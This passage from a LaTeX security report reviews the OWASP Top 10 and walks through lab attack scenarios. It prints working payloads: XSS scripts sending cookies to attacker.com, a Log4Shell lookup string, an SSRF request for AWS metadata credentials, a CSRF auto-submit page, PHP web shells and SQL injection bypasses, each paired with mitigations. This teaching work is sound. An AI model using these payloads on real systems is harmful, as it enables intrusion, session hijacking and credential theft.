+    \item \textbf{Disable External Entity Support (XXE):} Configure all XML parsers to explicitly disable the processing of XML External Entities and DTDs or disallow \texttt{DOCTYPE} declarations entirely if not needed. Ensure XML parsing libraries are up to date.
+\end{itemize}
+
+\section{A04:2021 – Insecure Design}
+\subsection{Mechanism}
+This category, new in 2021, emphasizes risks related to design and architectural flaws. It signifies a failure to integrate security considerations (\enquote{security by design}) early in the development lifecycle, leading to vulnerabilities that cannot be easily fixed with code patches alone. It often manifests as a lack of controls within the application's business logic, allowing for unintended or abusive functionality.
+
+\subsection{Example: Business Logic Flaw (Price Manipulation)}
+An e-commerce application might calculate the total price client-side (in JavaScript) or trust a price sent by the client. This is a severe design flaw. An attacker could:
+\begin{enumerate}
+    \item Add an item to the cart and intercept the request before it reaches the server (e.g., using Burp Suite).
+    \item Modify the \texttt{price} parameter in the intercepted JSON or form data to a significantly lower value (e.g., from \texttt{100.00} to \texttt{1.00}).
+    \item Forward the manipulated request to the server.
+\end{enumerate}
+\begin{lstlisting}[language=json, caption={Intercepted request with manipulated price parameter.}, label={lst:price-manipulation}]
+{
+  "item_id": "PROD123",
+  "quantity": 1,
+  "price": 1.00 // Attacker changed this value
+}
+\end{lstlisting}
+The server, if poorly designed to validate transaction integrity, might process this manipulated price for the final transaction, leading to significant financial loss for the vendor.
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Threat Modeling:} Systematically identify potential threats and vulnerabilities early in the design and architecture phases (e.g., using methodologies like STRIDE).
+    \item \textbf{Secure Design Patterns:} Implement security best practices and secure design patterns (e.g., granular privilege levels, multi-step sensitive transactions, robust server-side validation for all business logic and financial calculations).
+    \item \textbf{Explicit Trust Boundaries:} Clearly define and enforce trust boundaries throughout the application's components and with external systems. Never trust data received from the client for critical operations.
+\end{itemize}
+
+\section{A05:2021 – Security Misconfiguration}
+\subsection{Mechanism}
+This is one of the most common and easily exploitable vulnerabilities. It encompasses a wide range of issues such as insecure default configurations, incomplete hardening, unintendedly open cloud storage buckets, misconfigured HTTP headers (e.g., missing security headers), and verbose error messages that inadvertently reveal sensitive information.
+
+\subsection{Example: Default Accounts/Passwords and Directory Listing}
+\begin{itemize}
+    \item \textbf{Default Credentials:} Many frameworks, Content Management Systems (CMS), or server administration consoles are installed with default credentials (e.g., \texttt{admin:admin}, \texttt{root:toor}). If these are not changed after deployment, an attacker can simply log in and compromise the component.
+    \item \textbf{Verbose Error Messages:} If an application or server is configured to display full stack traces or database errors directly to the user, this can inadvertently reveal sensitive information like server file paths, database structure, or software versions, aiding attackers in their reconnaissance.
+    \item \textbf{Directory Listing Enabled:} A web server configured to display a list of all files and subdirectories if an \texttt{index.html} or \texttt{index.php} file is not present in a directory. This can expose sensitive configuration files, backup files, or even application source code, as shown in Figure \ref{fig:dir-listing}.
+\end{itemize}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/dir_listing.png}
+    \caption{Example of a security misconfiguration leading to directory listing.}
+    \label{fig:dir-listing}
+\end{figure}
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Automated Hardening:} Implement a repeatable server, framework, and application hardening process. Always remove or change all default credentials during initial setup.
+    \item \textbf{Disable Unused Features:} Disable all unnecessary services, ports, components, and features. For example, if an FTP server is not used on a web server, its service should be disabled.
+    \item \textbf{Custom Error Pages:} Configure the application and server to use generic, informative-only error pages (e.g., \texttt{HTTP 500 Internal Server Error}) instead of displaying verbose error messages directly to end-users.
+    \item \textbf{Disable Directory Listing:} Explicitly disable directory listing in web server configurations (e.g., Apache's \texttt{Options -Indexes} directive, Nginx \texttt{autoindex off}).
+    \item \textbf{Security Headers:} Implement relevant HTTP security headers like
+    Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security (HSTS).
+    \item \textbf{Regular Audits:} Conduct periodic security audits, vulnerability scans, and penetration tests to detect and remediate misconfigurations promptly across all environments.
+\end{itemize}
+
+\section{A06:2021 – Vulnerable and Outdated Components}
+\subsection{Mechanism}
+Modern applications rarely consist solely of custom-written code. They heavily rely on a multitude of third-party libraries, frameworks, APIs, and other software components (including operating systems, web servers, and databases). If any of these components contain known vulnerabilities (CVEs) and are not promptly updated or patched, the entire application inherits that risk, becoming susceptible to well-known exploitation techniques.
+
+\subsection{Example: Log4Shell (CVE-2021-44228)}
+The Log4Shell vulnerability in the widely used Apache Log4j library (a Java-based logging utility) is a recent and prominent example of the severe impact of vulnerable components.
+\begin{itemize}
+    \item \textbf{Vulnerability:} Log4Shell allowed attackers to inject a specific JNDI (Java Naming and Directory Interface) lookup string into any input that was logged by a vulnerable Log4j component.
+    \item \textbf{Exploitation:} For example, by sending a malicious \texttt{User-Agent} header containing \texttt{\$\{\,jndi:ldap://attacker.com/a\,\}} to a web application using Log4j for logging.
+    \item \textbf{Impact:} This would cause the vulnerable Log4j instance to make an outbound request to an attacker-controlled LDAP server, which would then deliver a malicious Java class. The vulnerable server would then execute this class, resulting in Remote Code Execution (RCE) and potentially full system compromise.
+\end{itemize}
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Component Inventory:} Maintain a comprehensive inventory of all software components, including direct and transitive dependencies (components used by your components), and their exact versions.
+    \item \textbf{Automated Scanning (SCA):} Use Software Composition Analysis (SCA) tools (e.g., OWASP Dependency-Check, Snyk) to automatically identify outdated or vulnerable components. Integrate these tools into the CI/CD pipeline for continuous monitoring.
+    \item \textbf{Patch Management:} Establish a robust and timely patch management process to promptly apply security updates and patches to all identified vulnerable components. Prioritize critical vulnerabilities.
+    \item \textbf{Secure Supply Chain:} Obtain components only from official and trusted sources. Verify their integrity (e.g., using digital signatures or checksums) upon download.
+    \item \textbf{Minimal Dependencies:} Avoid unnecessary dependencies. Remove unused dependencies, features, and documentation to reduce the attack surface.
+\end{itemize}
+
+\section{A07:2021 – Identification and Authentication Failures}
+\subsection{Mechanism}
+This category covers weaknesses in how an application confirms user identity (authentication) and manages user sessions (session management). Flaws can lead to compromised passwords, session hijacking, or allowing attackers to temporarily or permanently assume other users' identities. This combines issues previously listed under \enquote{Broken Authentication} and \enquote{Insecure Session Management.}
+
+\subsection{Example: Weak Password Policies and Session Management Issues}
+\begin{itemize}
+    \item \textbf{Weak Password Policies:} Applications that permit short, simple, or common passwords (e.g., \enquote{123456}, \enquote{password}, \enquote{Welcome1}) are highly susceptible to brute-force, dictionary, or credential stuffing attacks. Rate limiting for login attempts is often insufficient.
+    \item \textbf{Credential Stuffing:} Attackers use lists of username and password combinations obtained from data breaches (e.g., from other compromised websites) and try them against the application's login form. This attack exploits the common user behavior of reusing passwords across multiple services.
+    \item \textbf{Insecure Session Token Management:}
+    \begin{itemize}
+        \item \textit{Predictable Session IDs:} If session identifiers are not sufficiently random (e.g., sequential, guessable), attackers can predict valid session IDs, leading to session hijacking.
+        \item \textit{Session ID in URL:} Transmitting session IDs in URL parameters
+
+         (http://example.com/page?sessionid=ABC123). This exposes the ID to network sniffing, server logs, browser history, and accidental sharing, significantly facilitating session hijacking.
+        \item \textit{No Session Invalidation:} Failure to explicitly invalidate session IDs upon logout, password change, or extended inactivity allows old, potentially compromised sessions to remain valid and be exploited.
+    \end{itemize}
+\end{itemize}
+
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Strong Password Policy:} Enforce strong, complex password policies (minimum length, complexity requirements, discourage common passwords). Implement server-side rate limiting and CAPTCHA mechanisms for login attempts to deter automated attacks.
+    \item \textbf{Multi-Factor Authentication (MFA):} Implement MFA for all users, especially for privileged accounts. This adds a crucial layer of security, making it much harder for attackers to compromise accounts even if they obtain credentials.
+    \item \textbf{Secure Session Management:}
+    \begin{itemize}
+        \item Generate cryptographically random, long, and unpredictable session IDs.
+        \item Regenerate session IDs upon successful login and explicitly invalidate them upon logout or extended inactivity.
+        \item Use secure cookie flags: \texttt{HttpOnly} (prevents JavaScript access to cookies), \texttt{Secure} (sends cookies only over HTTPS), \texttt{SameSite} (prevents cookies from being sent with cross-site requests).
+        \item Never expose session IDs in URLs.
+    \end{itemize}
+\end{itemize}
+
+\section{A08:2021 – Software and Data Integrity Failures}
+\subsection{Mechanism}
+This new category focuses on failures related to verifying the integrity of software updates, critical data, and CI/CD pipelines. It often arises when applications do not adequately protect against malicious updates or unverified input that can compromise their operational integrity.
+
+\subsection{Example: Insecure Deserialization}
+\textbf{Mechanism:} Serialization converts an object into a stream of bytes for storage or transmission; deserialization is the reverse process of reconstructing the object from the byte stream. If an application deserializes user-controlled, untrusted data without validation, an attacker can craft a malicious serialized object.
+\textbf{Impact:} When the application attempts to deserialize this malicious object, it can trigger unintended code execution (RCE) if \enquote{gadget chains} (sequences of code that, when executed upon deserialization, trigger malicious behavior) are available in the application's dependencies (e.g., Apache Commons Collections in Java or PHP's \texttt{\_\_wakeup} method abuse).
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/deserialization_exploit.png}
+    \caption{Example of an Insecure Deserialization exploit leading to RCE.}
+    \label{fig:deserialization-exploit}
+\end{figure}
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Avoid Deserialization of Untrusted Data:} The safest approach is to never deserialize data from untrusted or unauthenticated sources. If deserialization is unavoidable, use formats that are less susceptible to gadget chain attacks (e.g., JSON, YAML) and rigorously validate content.
+    \item \textbf{Integrity Checks:} Implement integrity checks (e.g., digital signatures, Message Authentication Codes - MACs) for any serialized data to ensure it hasn't been tampered with.
+    \item \textbf{Minimal Privileges:} Run deserialization code with the minimum possible privileges in isolated environments.
+    \item \textbf{Update Dependencies:} Ensure all application dependencies are updated to avoid known deserialization gadget chains.
+\end{itemize}
+
+\section{A09:2021 – Security Logging and Monitoring Failures}
+\subsection{Mechanism}
+Without adequate logging, monitoring, and active alerting, it is nearly impossible for an organization to detect and respond to security incidents in a timely manner. This invisibility allows attackers to persist in the system for longer periods, expand their reach, and cause greater damage without detection.
+
+\subsection{Example: Undetected Website Defacement}
+A subtle failure in logging or monitoring might mean that administrators are unaware of changes to their public website or API endpoints for extended periods.
+\begin{enumerate}
+    \item \textbf{Defacement/Manipulation:} An attacker exploits a vulnerability (e.g., an Arbitrary File Upload flaw) to replace the application's homepage with a defaced version or subtly manipulate API responses to deliver malicious content.
+    \item \textbf{Lack of Detection:} If logs are not aggregated or reviewed, and no active monitoring for content changes (e.g., file integrity monitoring) or anomalous user activity is in place, the defacement or manipulation could go unnoticed for days or weeks.
+    \item \textbf{Impact:} This results in significant reputational damage, prolonged exposure to malicious content for users, and potential for further attacks (e.g., embedding XSS). Undetected failures contribute to unresponsive websites, SEO spam, or blacklisting. An attacker could maintain presence, perform further attacks, or manipulate user data unseen.
+\end{enumerate}
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Comprehensive Logging:} Log all security-relevant events, including both successful and failed authentication attempts, access control failures, server-side input validation errors, database access, changes to configurations, and critical business transactions.
+    \item \textbf{Centralized Logging and Monitoring (SIEM):} Send all logs to a centralized log management system (e.g., a SIEM - Security Information and Event Management) for aggregation, correlation, analysis, and long-term storage.
+    \item \textbf{Automated Alerting:} Configure automated alerts for suspicious activities (e.g., multiple failed logins from a single IP, unusual access patterns to administrative functions, changes to critical files, sudden spikes in traffic).
+    \item \textbf{Regular Log Review and Audits:} Regularly review logs and alerts. Conduct periodic security audits and content integrity checks. Implement website monitoring tools.
+\end{itemize}
+
+\section{A10:2021 – Server-Side Request Forgery (SSRF)}
+\subsection{Mechanism}
+SSRF flaws occur when a web application fetches a remote resource without properly validating a user-supplied URL. This allows an attacker to coerce the application into sending crafted HTTP requests to arbitrary destinations where the attacker themselves cannot reach directly, such as internal services, cloud metadata endpoints, or other external systems. The server acts as an unwitting proxy for the attacker.
+
+\subsection{Example Payload: Cloud Metadata Service Attack}
+In cloud environments (AWS, Azure, GCP), instances expose a special, non-routable IP address (\texttt{169.254.169.254} for AWS) to access an instance metadata service. This service provides information about the running instance, including crucial temporary access credentials if an IAM role is attached.
+If an application is vulnerable to SSRF, an attacker can provide the following URL to the vulnerable feature (e.g., an image resizing service that fetches a URL):
+\begin{lstlisting}[language=http, caption={SSRF payload targeting AWS metadata service for credential theft.}, label={lst:ssrf-aws-payload}]
+GET /api/image-resize?url=http://169.254.169.254/latest/meta-data/iam/
+security-credentials/ROLENAME HTTP/1.1
+Host: example.com
+\end{lstlisting}
+The server, acting as a proxy, fetches these credentials and potentially returns them in the application's response.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/ssrf_aws.png}
+    \caption{SSRF used to exfiltrate AWS credentials from the metadata service.}
+    \label{fig:ssrf-aws-exploit-image}
+\end{figure}
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Strict Allow-List for URLs:} Implement a strict \textbf{allow-list} of the specific domains, IP addresses, and ports that the application is explicitly permitted to connect to. All other requests should be blocked at the application layer. This is the most robust defense.
+    \item \textbf{Block Private and Reserved IP Ranges:} If arbitrary external domains must be allowed, the application should first resolve the user-supplied domain name to an IP address and rigorously check it against a \textbf{block-list (blacklist)} of all private (RFC 1918) and reserved IP ranges (e.g., \texttt{10.0.0.0/8}, \texttt{172.16.0.0/12}, \texttt{192.168.0.0/16}, \texttt{127.0.0.1/8}, and the metadata service IP \texttt{169.254.169.254/32}). This prevents access to internal resources.
+    \item \textbf{Disable Unused URL Schemas:} Configure the application's HTTP client or URL parsing library to only allow safe schemas (\texttt{http}, \texttt{https}). Explicitly disable dangerous schemas like \texttt{file://}, \texttt{gopher://}, \texttt{dict://}).
+    \item \textbf{Network-Level Egress Filtering:} Implement firewall rules on the web server to prevent it from initiating outbound connections to internal network segments or unauthorized external endpoints. This acts as a crucial last line of defense.
+\end{itemize}
+
+\section{Cross-Site Scripting (XSS)}
+\subsection{Mechanism}
+XSS is an injection vulnerability that allows attackers to inject malicious scripts (typically JavaScript) into trusted websites. These scripts are then executed in the victim's browser, potentially hijacking user sessions, defacing websites, or redirecting users to malicious sites. XSS attacks target users, not directly the server, by exploiting a web application's trust in user-supplied content.
+
+\subsubsection{XSS Types and Payloads}
+\begin{itemize}
+    \item \textbf{Stored XSS (Persistent XSS):} The malicious script is permanently stored on the server (e.g., in a database via a comment field, forum post, or profile description) and subsequently delivered to all users who view the affected page. This is the most dangerous type of XSS due to its persistence and widespread impact.
+    \begin{lstlisting}[language=html, caption={Stored XSS payload for cookie theft.}]
+<script>
+  fetch('http://attacker.com/cookiestealer.php?c=' + document.cookie);
+</script> // eg. http://webhook.site/...
+    \end{lstlisting}
+        \item \textbf{Reflected XSS:} The malicious script comes from the current HTTP request parameter and is immediately returned, unprocessed, in the HTTP response. The attacker crafts a malicious URL containing the payload and tricks the victim into clicking it.
+    \begin{verbatim}
+https://example.com/search?query=<script>alert('XSS')</script>
+    \end{verbatim}
+    \item \textbf{DOM-based XSS:} The vulnerability exists entirely client-side, within the victim's browser. The malicious script is executed when client-side JavaScript processes user-controlled data from the DOM (e.g., URL fragment \texttt{window.location.hash}) and writes it into an unsafe \enquote{sink} (e.g., \texttt{document.write()}, \texttt{innerHTML}, \texttt{eval()}).
+    \begin{verbatim}
+https://example.com/page.html#<img src=1 onerror=alert('DOM-XSS')>
+    \end{verbatim}
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/xsses.png}
+    \caption{Comparison of Stored vs. Reflected vs. DOM-based XSS.}
+    \label{fig:stored-vs-reflected}
+\end{figure}
+
+\subsection{Mitigation (XSS)}
+\begin{itemize}
+    \item \textbf{Context-Aware Output Encoding:} This is the primary defense. All user-supplied data must be properly HTML-encoded (or URL-encoded, JavaScript-encoded, etc., depending on the specific context where it will be rendered in the web page) before being displayed. For PHP in an HTML body context, \texttt{htmlspecialchars()} is crucial.
+    \item \textbf{Content Security Policy (CSP):} A restrictive CSP HTTP response header can prevent the browser from executing unauthorized scripts (e.g., blocking inline scripts or scripts loaded from untrusted domains). This acts as a powerful second layer of defense.
+    \item \textbf{HttpOnly Cookie Flag:} Setting the \texttt{HttpOnly} flag on session cookies prevents client-side JavaScript from accessing them (e.g., \texttt{document.cookie} will return empty for HttpOnly cookies). While it doesn't prevent XSS itself, it renders cookie-stealing XSS payloads ineffective for these cookies.
+\end{itemize}
+
+\section{Cross-Site Request Forgery (CSRF)}
+\subsection{Mechanism}
+CSRF forces an end user to execute unwanted actions on a web application in which they are currently authenticated. The attack exploits the browser's behavior of automatically including authentication tokens (e.g., session cookies) in requests to a given domain, regardless of where the request originates. The attacker simply needs to trick a victim into sending a legitimate, state-changing request.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/csrf_flow.png}
+    \caption{The attack flow of a Cross-Site Request Forgery.}
+    \label{fig:csrf-flow}
+\end{figure}
+
+\subsection{Example Payload: Auto-Submitting Form}
+An attacker can create a malicious HTML page that includes a hidden form. This form is configured to automatically submit a \texttt{POST} request to a vulnerable application (e.g., to change the victim's email address or password) using JavaScript, as soon as the victim visits the attacker's page.
+\begin{lstlisting}[language=html, caption={An attacker's page with a malicious auto-submitting form.}, label={lst:csrf-form}]
+<html>
+  <body>
+    <!-- Hidden form targets the vulnerable application's email change function -->
+    <form id="csrf-form" action="http://vulnerable-website.com/user/change_email" method="POST">
+      <input type="hidden" name="new_email" value="attacker@evil.com" />
+      <!-- If present, an Anti-CSRF token might be needed, or its absence/guessability could be exploited -->
+      <input type="hidden" name="csrf_token" value="[UNKNOWN_OR_GUESSED_TOKEN]" /> 
+    </form>
+    <script>
+      // Automatically submit the form upon page load
+      document.getElementById("csrf-form").submit();
+    </script>
+  </body>
+</html>
+\end{lstlisting}
+If a logged-in user of \texttt{vulnerable-website.com} is tricked into visiting this malicious page, their browser automatically sends the \texttt{POST} request to the legitimate application, including their active session cookies. The application, failing to distinguish this forged request from a genuine one, processes the email change on behalf of the victim.
+
+\subsection{Mitigation (CSRF)}
+\begin{itemize}
+    \item \textbf{Anti-CSRF Tokens (Synchronizer Token Pattern):} This is the most robust defense. The server generates a unique, unpredictable, and cryptographically secure token for each state-changing form. This token is embedded as a hidden field in the form. Upon submission, the server validates that the submitted token matches the one stored in the user's session. Attackers cannot guess this token.
+    \item \textbf{SameSite Cookies:} Setting the \texttt{SameSite} attribute on session cookies (SameSite=Strict or SameSite=Lax) instructs the browser not to send the cookie with cross-site requests, mitigating most CSRF attacks.
+    \item \textbf{Referrer-Policy Header:} Implement a strong \texttt{Referrer-Policy} HTTP header (e.g., \texttt{same-origin}) to control the information sent in the \texttt{Referer} header. This can help prevent leakage but is not a primary defense.
+    \item \textbf{User Re-authentication:} For critical actions (e.g., password change, financial transactions), require the user to re-authenticate or confirm their password as a secondary defense layer.
+\end{itemize}
+
+\section{File Manipulation Vulnerabilities}
+
+\subsection{Arbitrary File Upload}
+\subsubsection{Mechanism}
+Arbitrary File Upload vulnerabilities allow attackers to upload malicious files (e.g., web shells) to the server if the application's file upload functionality lacks proper validation. This can lead to Remote Code Execution (RCE) and, consequently, complete server control. Attackers often exploit weak filename or content type checks.
+
+\subsubsection{Example Payloads}
+\begin{itemize}
+    \item \textbf{PHP Web Shell:} A simple script that takes a command via a GET/POST parameter and executes it using \texttt{system()}.
+    \begin{lstlisting}[language=php, caption={PHP Web Shell Payload.}]
+<?php if(isset($-REQUEST['cmd'])){ system($-REQUEST['cmd']); } ?>\end{lstlisting}
+    \item \textbf{Bypass Extensions:} Renaming \texttt{shell.php} to \texttt{shell.php.jpg} (a double extension bypass to trick filters) or \texttt{shell.phar} (an executable PHP archive file) can circumvent basic extension blacklists.
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/file_upload_post_request.png}
+    \caption{Example POST request for a vulnerable file upload endpoint.}
+    \label{fig:file-upload-post-request}
+\end{figure}
+
+\subsection{Local File Inclusion (LFI)}
+\subsubsection{Mechanism}
+LFI vulnerabilities occur when an application constructs a file path based on user-supplied input without proper validation and then includes or accesses this file. This allows attackers to include arbitrary local files from the server's filesystem, potentially revealing sensitive information (e.g., \texttt{/etc/passwd}).
+
+\subsubsection{Example Payloads}
+\begin{itemize}
+    \item \textbf{Path Traversal:} Manipulating the \texttt{file} parameter to navigate directory structures.
+    \begin{verbatim}
+GET /index.php?file=../../../../etc/passwd HTTP/1.1
+Host: example.com
+    \end{verbatim}
+    \item \textbf{Log Poisoning for RCE:} Injecting a PHP shell into a writable log file (e.g., Apache \texttt{access.log} via the \texttt{User-Agent} header) and then including this log file via LFI.
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/lfi_passwd_example.png}
+    \caption{Example of LFI used to display \texttt{/etc/passwd}.}
+    \label{fig:lfi-passwd-example}
+\end{figure}
+
+\section{Conclusion}
+This chapter provided an in-depth review of the OWASP Top 10 (2021), explaining the mechanisms behind key vulnerabilities such as Injection, Broken Access Control, Cryptographic Failures, and Security Misconfigurations. It emphasized the importance of secure design, supply chain integrity, and strong authentication, logging, and monitoring practices. By outlining these risks and their implications, the chapter established a solid theoretical foundation that the next chapter will extend with practical exploitation and mitigation examples.
+
+\cleardoublepage
+
+% --- CHAPTER 3: Practical Attacks ---
+\chapter{Practical Attack Scenarios and Mitigations}
+\label{chap:practical-app}
+
+\section{Introduction}
+This chapter transitions from theoretical knowledge to practical application, detailing the hands-on exploitation of critical web vulnerabilities in a simulated lab environment, drawing inspiration from real-world penetration testing challenges often found on platforms like Hack The Box. Each scenario demonstrates a step-by-step process, from identifying the flaw to successful exploitation, and concludes with robust mitigation strategies. Proficiency with tools like Burp Suite for traffic interception and manipulation, Python's \texttt{requests} library for crafting HTTP requests, and Netcat for listening to reverse shells are essential for these exercises.
+
+\section{Scenario 1: SQL Injection - Authentication Bypass}
+\subsection{The Challenge}
+The target is a web application with a standard login page. The objective is to gain administrative access to the application without possessing valid credentials. This challenge specifically tests for classic, error-based SQL Injection.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Vulnerability Identification (Login Page):} The attacker interacts with the login form. A common first test for SQL Injection involves submitting a single quote (\texttt{'}) into the username field (e.g., username: \texttt{'}, password: \texttt{anypassword}).
+    The application's response is a verbose MySQL error message (e.g., \enquote{You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '...'} ). This explicit error confirms that the input is being directly processed by a SQL query and that database errors are not suppressed. This signifies a high likelihood of an SQLi vulnerability.
+    \item \textbf{Payload Crafting:} Based on the error and the inferred query structure (e.g., \texttt{SELECT * FROM users WHERE username='[INPUT]' AND password='[PASSWORD]'}), the attacker crafts an authentication bypass payload. The classic payload to make the \texttt{WHERE} clause always true is:
+    \begin{lstlisting}[language=sql, caption={SQLi payload for authentication bypass.}, label={lst:sqli-bypass-payload-ex1}]
+' OR '1'='1' -- \end{lstlisting}
+    In MySQL/PostgreSQL, the double dash (\texttt{--}) initiates a SQL comment, effectively nullifying the rest of the original query (including the password check).
+    \item \textbf{Execution (Login Form):} The attacker enters the crafted payload (\texttt{' OR '1'='1' --}) into the username field and any random string (e.g., \texttt{password}) into the password field. The login form is submitted.
+\end{enumerate}
+
+\subsection{Result}
+The server-side application processes the malicious SQL query. Due to the \texttt{OR '1'='1'} condition evaluating to true, the original authentication check is successfully bypassed. The application often logs the attacker in as the first user returned by the modified query (typically an administrator or a default user account). The attacker is then redirected to the administrator's control panel or dashboard, thereby gaining unauthorized administrative access to the application.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{figures/sqli_success.png}
+    \caption{The administrator dashboard accessed after a successful SQLi bypass.}
+    \label{fig:sqli-success}
+\end{figure}
+
+\subsection{Mitigation Strategy}
+The root cause of this SQL Injection vulnerability is the direct concatenation of user-supplied input into the SQL query string. The most effective defense is to use prepared statements (parameterized queries), which strictly separate SQL code from the data.
+\begin{lstlisting}[language=php, caption={Secure Login with Prepared Statements in PHP (using PDO).}, label={lst:secure-login}]
+<?php
+// 1. Retrieve user input (e.g., from POST request)
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// 2. Prepare the SQL statement with named placeholders.
+// The query structure is sent to the database first, without user input.
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+
+// 3. Bind parameters. The values are sent separately and treated only as data, not code.
+$stmt->execute(['username' => $username]);
+$user = $stmt->fetch();
+
+// 4. Verify password securely (after fetching, using password_verify for hashed passwords)
+if ($user && password_verify($password, $user['password_hash'])) {
+    // Login successful - proceed to create user session securely
+    session_start();
+    $_SESSION['user_id'] = $user['id'];
+    $_SESSION['username'] = $user['username'];
+    // Redirect to authenticated dashboard
+    header("Location: dashboard.php");
+    exit();
+} else {
+    // Login failed - display a generic error message to avoid information disclosure
+    echo "Invalid username or password.";
+}
+?>
+\end{lstlisting}
+Additional defenses include robust input validation and the principle of least privilege for the database user account used by the web application.
+
+\section{Scenario 2: Cross-Site Scripting (XSS) - Stored Cookie Stealing}
+\subsection{The Challenge}
+A blog application allows users to post comments. The comment field is vulnerable to Stored XSS, meaning user input is saved to the database and later displayed without proper encoding. The objective is to steal the session cookie of an administrator who reviews the comments, thereby hijacking their session.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Payload Preparation (Attacker's Server):} The attacker first sets up a simple PHP script (\texttt{cookiestealer.php}) on their own web server (e.g., \texttt{attacker.com}). This script is designed to capture and log any data sent to it via \texttt{GET} parameters, particularly a cookie string.
+    \item \textbf{Payload Crafting (XSS Vector):} The attacker crafts a JavaScript payload that instructs the victim's browser to fetch its own \texttt{document.cookie} (which contains the session ID) and send this data as a \texttt{GET} parameter to their \texttt{cookiestealer.php} script.
+    \begin{lstlisting}[language=html, caption={XSS payload for cookie theft, submitted as a comment.}, label={lst:xss-cookie-theft-payload-ex2}]
+<script>
+  // Encode the cookie data to handle special characters correctly
+  var stolenCookie = encodeURIComponent(document.cookie);
+  // Send the stolen cookie to the attacker's server
+  fetch('http://attacker.com/cookiestealer.php?c=' + stolenCookie);
+</script>\end{lstlisting}
+    \item \textbf{Execution (Blog Comment Submission):} The attacker submits this malicious JavaScript payload as a new comment on the vulnerable blog. The application, failing to properly encode or sanitize the input, stores the script directly in its database associated with the comment.
+    \item \textbf{Victim Interaction (Admin Review):} Later, when the administrator (or any user) navigates to the blog post to review comments, their browser retrieves the webpage from the server. The injected malicious script, now part of the trusted webpage content, is executed by the browser. This script then sends the administrator's session cookie to \texttt{attacker.com}.
+\end{enumerate}
+
+\subsection{Result}
+The attacker checks the \texttt{stolen\_cookies.txt} log file on their server. They find an entry containing the administrator's session cookie. With this cookie, the attacker can now inject it into their own browser (e.g., using browser developer tools or a web proxy like Burp Suite) and successfully hijack the administrator's session, thereby gaining full administrative access to the blog application.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{figures/xss_exploited.png}
+    \caption{Request to attacker's server with victim's cookie.}
+    \label{fig:cookie-stealing}
+\end{figure}
+
+\subsection{Mitigation Strategy}
+Preventing XSS requires a multi-faceted approach, primarily focusing on robust output encoding and browser-level protections.
+\begin{itemize}
+    \item \textbf{Context-Aware Output Encoding:} This is the primary defense. All user-supplied data must be properly HTML-encoded (or URL-encoded, JavaScript-encoded, etc., depending on the context where it will be rendered) before being displayed on the page. In PHP, \texttt{htmlspecialchars()} is a crucial function for encoding output in HTML contexts.
+    \begin{lstlisting}[language=php, caption={Secure comment display using HTML encoding.}, label={lst:secure-comment-display-ex2}]
+<?php
+// Assuming $comment_content comes from user input and is retrieved from the database
+$comment_content = "<p>This is a comment with <script>alert('XSS')</script></p>"; 
+
+// SECURE: HTML-encode user input before displaying it to the browser.
+echo "<p>User Comment: " . htmlspecialchars($comment_content, ENT_QUOTES, 'UTF-8') . "</p>";
+// Output will be: <p>User Comment: &lt;p&gt;This is a comment with &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&lt;/p&gt;</p>
+?>
+    \end{lstlisting}
+    \item \textbf{Content Security Policy (CSP):} A restrictive CSP HTTP response header can prevent the browser from executing unauthorized scripts (e.g., blocking inline scripts or scripts loaded from untrusted domains like \texttt{attacker.com}). This acts as a powerful second layer of defense.
+    \item \textbf{HttpOnly Cookie Flag:} Setting the \texttt{HttpOnly} flag on session cookies prevents client-side JavaScript from accessing them (e.g., \texttt{document.cookie} will return empty for HttpOnly cookies). While it doesn't prevent XSS itself, it renders cookie-stealing XSS payloads ineffective for these cookies.
+\end{itemize}
+
+\section{Scenario 3: Arbitrary File Upload - Obtaining a Web Shell}
+\subsection{The Challenge}
+An application has a profile management feature that allows users to upload a profile picture. The server implements a basic filter that only permits files with \texttt{.jpg} or \texttt{.png} extensions. The objective is to bypass this filter and upload a malicious PHP script to gain a web shell, allowing remote code execution on the server.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Payload Creation (Web Shell):} The attacker creates a simple PHP web shell script. This script, when executed by the web server, provides a command execution interface.
+    \begin{lstlisting}[language=php, caption={A simple PHP web shell payload.}, label={lst:php-web-shell-payload-ex3}]
+<?php
+$cmd = $-REQUEST['cmd'];
+  if(isset($cmd)){
+    system($cmd);
+  }?>\end{lstlisting}
+    \item \textbf{Bypass Technique (Double Extension):} The attacker needs to circumvent the server's basic extension filter. Instead of simply naming it \texttt{shell.php}, they rename the file to \texttt{shell.php.jpg}. This double extension technique is designed to fool naive filters that only check the string after the \textit{final} dot. However, a web server (like Apache with \texttt{mod\_php}) may be configured to execute the file with the PHP interpreter because of the \texttt{.php} extension it finds first in the filename.
